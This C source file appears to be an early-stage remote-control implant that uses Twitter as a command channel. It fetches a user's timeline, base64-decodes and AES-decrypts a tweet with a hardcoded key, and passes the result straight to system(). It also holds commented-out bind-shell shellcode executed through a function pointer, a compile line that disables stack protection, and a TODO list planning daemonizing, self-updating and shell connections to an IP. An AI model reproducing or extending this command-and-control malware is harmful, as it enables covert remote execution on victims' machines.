/**
 * https://dev.twitter.com/rest/reference/get/statuses/user_timeline
 * http://pixelrobotics.com/2013/01/consuming-the-twitter-public-stream-with-libcurl/
 * https://curl.haxx.se/libcurl/c/getinmemory.html
 * http://stackoverflow.com/questions/21023605/initialize-array-of-strings
 * Compile with:
 *
 * gcc -g get.c base64decode.c base64encode.c -o get -lcrypto -loauth -lcurl -Og -foptimize-sibling-calls -fno-stack-protector -z execstack
 *
 * @TODO:
 * (In Progress) Pull latest tweets from a twitter feed
 *    (/) Hit Twitter API
 *    (/) Store CURL results in memory
 *    (/) Use environment variables for credentials
 *    (/) Copy tweets into an array in memory
 *    (/) Save Base64 encoded bodies only into memory
 * (/) Base64 decode tweet
 * (*) Divide commands longer than 140 chars over multiple tweets
 * (*) Re-assemble commands longer than 140 chars from multiple tweets
 * (*) Encode/Decode tweet... Choose cipher
 * (*) Cast as function pointer and execute
 * (*) Schedule on a cadence
 * (*) Run as a daemon
 * (*) Update binary
 * (*) Initiate shell connection to IP
 * (*) Devise way to spin off connections to each client
 * (*) Keep state of last action performed
 * (*) Replace libcurl with pure socket IO
 * (*) Statically link liboauth
 * (*) Replace liboauth with pure c?
 **/

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <oauth.h>
#include <curl/curl.h>
#include "base64encode.h"
#include "base64decode.h"
#include "aesencrypt.h"
#include "aesdecrypt.h"
#include "umamicrypt.h"

#define TWEET_COUNT 11
#define TWEET_LENGTH 141
#define DATAFILE "tweetdata.json"
#define KEY "01234567890123456789012345678901"
#define IV "01234567890123456"

struct MemoryStruct {
    char *memory;
    size_t size;
} chunk;

typedef enum { LIVE_MODE, OFFLINE_MODE, ACQUIRE_MODE } AppMode_t;

char **TWEETS;

void InitializeTweets(void)
{
    // allocate space for 10 pointers to tweets(strings)
    TWEETS = (char**)malloc(TWEET_COUNT*sizeof(char*));
    int i = 0;
    //allocate space for each tweet(string)
    // here allocate TWEET_LENGTH bytes
    for(i = 0; i < TWEET_COUNT; i++){
        printf("Initializing %d bytes for tweet: %d\n", TWEET_LENGTH,i);
        TWEETS[i] = (char*)malloc(TWEET_LENGTH*sizeof(char));
        memset(TWEETS[i], 0, sizeof(TWEETS[i]));
    }
}

static size_t
WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    mem->memory = realloc(mem->memory, mem->size + realsize + 1);
    if(mem->memory == NULL) {
        /* out of memory! */
        printf("not enough memory (realloc returned NULL)\n");
        return 0;
    }

    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

void TwitterConnect(AppMode_t m)
{
    FILE *out;
    const char *ckey = getenv("CKEY");
    const char *csecret = getenv("CSECRET");
    const char *atok = getenv("ATOK");
    const char *atoksecret = getenv("ATOKSECRET");

    curl_global_init(CURL_GLOBAL_ALL);
    CURL *curl = curl_easy_init();

    const char *url = "https://api.twitter.com/1.1/statuses/user_timeline.json?user_id=blischalk&count=10";

    // URL, POST parameters (not used in this example), OAuth signing method, HTTP method, keys
    char *signedurl = oauth_sign_url2(url, NULL, OA_HMAC, "GET", ckey, csecret, atok, atoksecret);

    // URL we're connecting to
    curl_easy_setopt(curl, CURLOPT_URL, signedurl);

    // User agent we're going to use, fill this in appropriately
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "appname/0.1");

    // libcurl will now fail on an HTTP error (>=400)
    curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1);


    if (m == ACQUIRE_MODE) {
        out = fopen(DATAFILE, "w");
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)out);
    } else {
        chunk.memory = malloc(1);  /* will be grown as needed by the realloc above */
        chunk.size = 0;    /* no data at this point */
        /* send all data to this function  */
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    }

    /* get it! */
    int res = curl_easy_perform(curl);

    /* check for errors */
    if(res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));
    }


    if (m == ACQUIRE_MODE)
        fclose(out);

    curl_easy_cleanup(curl);
    curl_global_cleanup();
}

/**
 * Populates either a file or memory from
 * Twitter API
 **/

void PopulateTweets(char *tweet_data, int tweets_index)
{
    // Look for a tweet body
    // this is fragile and we are lucky that the body of a tweet
    // happens to follow this pattern uniquely
    char *tweet_pt = strstr(tweet_data, ",\"text\":");

    // If a tweet body found
    if (tweet_pt != NULL)
    {
        // Move pointer forward to beginning of tweet body text
        tweet_pt = tweet_pt+9;

        // Locate the end of the tweet body
        char *tweet_end = strstr(tweet_pt, "\"");

        int char_index = 0;

        // Copy each character of the tweet into
        // Tweets
        //printf("Tweets index: %d\n", tweets_index);
        while(tweet_pt != tweet_end)
        {
            //printf("%c", *tweet_pt);
            TWEETS[tweets_index][char_index] = *tweet_pt;
            tweet_pt = tweet_pt+1;
            char_index++;
        }
        //printf("\n");
        PopulateTweets(tweet_end, (tweets_index+1));
    }
}

void ExecuteTweet(void)
{
    // Decrypt here

    printf("The third tweet is: \n");
    printf("%s\n", TWEETS[2]);

    int counter;
    int base64DecodedLen;
    char* base64DecodeOutput;

    Base64Decode(&base64DecodeOutput, TWEETS[2]);
    base64DecodedLen = strlen((const char *)base64DecodeOutput);

    printf("Dumping Base64 Decoded Bytes\n");
    for (counter=0; counter < base64DecodedLen; counter++)
    {
      printf("\\x%.2x",base64DecodeOutput[counter]);
    }
    printf("\n");

    /* Buffer for the decrypted text */
    unsigned char decryptedtext[10000];

    int decryptedtext_len, ciphertext_len;

    ///* A 256 bit key */
    unsigned char *key = (unsigned char *)KEY;

    ///* A 128 bit IV */
    unsigned char *iv = (unsigned char *)IV;

    ///* Initialise the library */
    ERR_load_crypto_strings();
    OpenSSL_add_all_algorithms();
    OPENSSL_config(NULL);

    ciphertext_len = strlen(base64DecodeOutput);

    ///* Decrypt the ciphertext */
    decryptedtext_len = decrypt(base64DecodeOutput, ciphertext_len, key, iv,
                                decryptedtext);

    decryptedtext[decryptedtext_len] = '\0';

    printf("Dumping AES Decrypted Bytes\n");

    for (counter=0; counter < decryptedtext_len; counter++)
    {
      printf("\\x%02x",decryptedtext[counter]);
    }

    printf("\n");
    printf("\n");

    system(decryptedtext);

    /* Clean up */
    EVP_cleanup();
    ERR_free_strings();
    // Cast to function pointer
    // Execute

    //unsigned char code[] = \
    //    "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31"
    //    "\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66"
    //    "\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04"
    //    "\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51"
    //    "\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49"
    //    "\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    //    "\x89\xe3\x31\xc9\x31\xd2\xcd\x80";


    //printf("About to execute\n");
    //int (*ret)() = (int(*)())code;
    ////ret();
    //printf("Executed\n");
}

char * ReadTweetsFromFile()
{
    char *file_contents;
    long input_file_size;
    FILE *input_file = fopen(DATAFILE, "rb");
    fseek(input_file, 0, SEEK_END);
    input_file_size = ftell(input_file);
    rewind(input_file);
    file_contents = malloc(input_file_size * (sizeof(char)));
    fread(file_contents, sizeof(char), input_file_size, input_file);
    fclose(input_file);
    return file_contents;
}

void Acquire()
{
    TwitterConnect(ACQUIRE_MODE);
}

void Live()
{

    InitializeTweets();
    TwitterConnect(LIVE_MODE);
    PopulateTweets(chunk.memory,0);
    printf("About to call ExecuteTweet\n");
    ExecuteTweet();
}

void Offline()
{
    InitializeTweets();
    PopulateTweets(ReadTweetsFromFile(),0);
    ExecuteTweet();
}

void DivideIntoTweets(char * payload, int length)
{

    int i = 0, j = 0, k = 0, max_tweets = 10;
    char tweets[max_tweets][TWEET_LENGTH];

    if (length / TWEET_LENGTH > max_tweets)
        return;

    printf("Dividing into tweets...............\n");

    for(i=0; i < length; i++)
    {
        if (i != 0 && (i % TWEET_LENGTH) == 0 )
        {
            tweets[j][k] = '\00';
            j++;
            k = 0;
            printf("\n");
        }

        tweets[j][k] = payload[i];
        printf("%c", payload[i]);
        k++;
    }
    printf("\n");
}


int main(int argc, char *argv[])
{
    int opt;
    int length;
    char *encoded;

    while ((opt = getopt(argc, argv, "loae")) != -1) {
        switch (opt) {
        case 'a':
            Acquire();
            break;
        case 'l':
            Live();
            break;
        case 'o':
            Offline();
            break;
        case 'e':
            length = Encode(&encoded, argv[2], (unsigned char *)KEY, (unsigned char *)IV);
            DivideIntoTweets(encoded, length);

            break;
        default:
            fprintf(stderr, "Usage: %s [-loae] \n", argv[0]);
            exit(EXIT_FAILURE);
        }
    }

    // Cleanup struct that was allocated
    free(chunk.memory);
    return 0;
}
